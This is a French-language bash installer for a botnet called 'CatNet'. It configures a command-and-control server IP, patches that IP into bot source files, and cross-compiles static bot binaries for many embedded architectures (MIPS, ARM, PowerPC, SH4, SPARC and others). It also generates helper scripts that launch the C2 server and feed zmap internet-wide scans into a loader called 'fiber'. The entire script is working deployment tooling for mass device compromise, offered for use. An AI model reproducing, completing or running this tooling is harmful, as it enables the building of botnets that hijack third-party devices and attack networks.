#!/bin/bash

# CatNet Botnet - Script d'installation automatique v2.0
# Amélioré pour une meilleure robustesse et performance

# Couleurs pour une meilleure lisibilité
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Fonction de log
log() {
  echo -e "${BLUE}[$(date +'%H:%M:%S')]${NC} $1"
}

success() {
  echo -e "${GREEN}[+] $1${NC}"
}

warn() {
  echo -e "${YELLOW}[!] $1${NC}"
}

error() {
  echo -e "${RED}[ERR] $1${NC}"
  exit 1
}

echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║            CATNET BOTNET INSTALLER v2.0       ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"

# 1. Vérifications initiales
if [ "$EUID" -ne 0 ]; then
  error "Ce script doit être exécuté en tant que root."
fi

# Détecter l'IP publique
PUBLIC_IP=$(curl -s https://api.ipify.org || echo "INCONNUE")
log "Détection de l'IP publique: ${CYAN}$PUBLIC_IP${NC}"

# Demander l'adresse IP du serveur C2 (proposer l'IP publique par défaut)
echo -e "${YELLOW}[?] Entrez l'adresse IP du serveur C2 [Défaut: $PUBLIC_IP]:${NC}"
read C2_IP
C2_IP=${C2_IP:-$PUBLIC_IP}

# Valider l'adresse IP
if [[ ! $C2_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  error "Adresse IP '$C2_IP' invalide."
fi

success "Configuration C2 IP: $C2_IP"

# 2. Optimisation du système
log "Optimisation des limites système (ulimit)..."
sysctl -w fs.file-max=1000000 >/dev/null
ulimit -n 1000000
echo "* soft nofile 1000000" >> /etc/security/limits.conf
echo "* hard nofile 1000000" >> /etc/security/limits.conf

# 3. Installation des dépendances
log "Installation des dépendances (cela peut prendre du temps)..."
apt update -qq
apt install -y golang zmap gcc-multilib libc6-dev-i386 linux-libc-dev:i386 \
  gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
  gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
  gcc-sparc64-linux-gnu \
  libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross \
  libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross \
  libc6-dev-sparc64-cross \
  screen python3 python3-pip -qq

# 4. Configuration des sources
log "Mise à jour des fichiers source..."
sed -i "s/c2ServerIP = \".*\"/c2ServerIP = \"$C2_IP\"/g" fiber.go
sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$C2_IP\"/g" bot.c

# 5. Compilation
log "Compilation de Fiber (Go)..."
go build -ldflags="-s -w" -o fiber fiber.go
chmod +x fiber

log "Compilation des binaires Bot (Multithreaded)..."
compile_bot() {
    local arch=$1
    local compiler=$2
    local flags=$3
    local output=$4
    log "Compiling for ${arch}..."
    $compiler $flags -static -o $output bot.c >/dev/null 2>&1
    if [ -f "$output" ]; then
        success "Compiled $output"
    else
        warn "Failed to compile for $arch"
    fi
}

# Compilation parallèle des bots
compile_bot "MIPS" "mips-linux-gnu-gcc" "-D__MIPS__" "bot.mips" &
compile_bot "ARM" "arm-linux-gnueabi-gcc" "-D__ARM__" "bot.arm" &
compile_bot "ARM64" "aarch64-linux-gnu-gcc" "-D__ARM__" "bot.arm7" &
compile_bot "x86" "gcc" "-m32" "bot.x86" &
compile_bot "x86_64" "gcc" "" "bot.x86_64" &
compile_bot "PowerPC" "powerpc-linux-gnu-gcc" "-D__PPC__" "bot.ppc" &
compile_bot "SH4" "sh4-linux-gnu-gcc" "" "bot.sh4" &
compile_bot "M68K" "m68k-linux-gnu-gcc" "" "bot.m68k" &
compile_bot "SPARC" "sparc64-linux-gnu-gcc" "-D__SPARC__" "bot.sparc" &

wait # Attendre la fin de toutes les compilations

# 6. Scripts utilitaires
log "Génération des scripts de contrôle..."

cat > start_c2.sh << EOL
#!/bin/bash
log() { echo -e "\e[36m[C2]\e[0m \$1"; }
log "Démarrage du C2..."
screen -dmS c2_server python3 simple_c2.py
log "Serveur C2 démarré. Accès: screen -r c2_server"
EOL
chmod +x start_c2.sh

cat > start_scanner.sh << EOL
#!/bin/bash
if [ \$# -ne 1 ]; then
  echo "Usage: \$0 <port>"
  exit 1
fi
PORT=\$1
log() { echo -e "\e[32m[SCANNER]\e[0m \$1"; }
log "Optimisation système..."
ulimit -n 1000000
log "Démarrage du scan sur le port \$PORT..."
screen -dmS scanner_\$PORT bash -c "zmap -p\$PORT -w all.lst -q | ./fiber \$PORT"
log "Scanner démarré. Accès: screen -r scanner_\$PORT"
EOL
chmod +x start_scanner.sh

# 7. Nettoyage et Finalisation
log "Nettoyage..."
rm -f *.o

success "INSTALLATION TERMINÉE AVEC SUÈS!"
echo -e "${CYAN}--------------------------------------------------${NC}"
echo -e "1. Lancez le C2      : ./start_c2.sh"
echo -e "2. Lancez le scanner : ./start_scanner.sh 80"
echo -e "3. Voir les sessions : screen -ls"
echo -e "${CYAN}--------------------------------------------------${NC}"
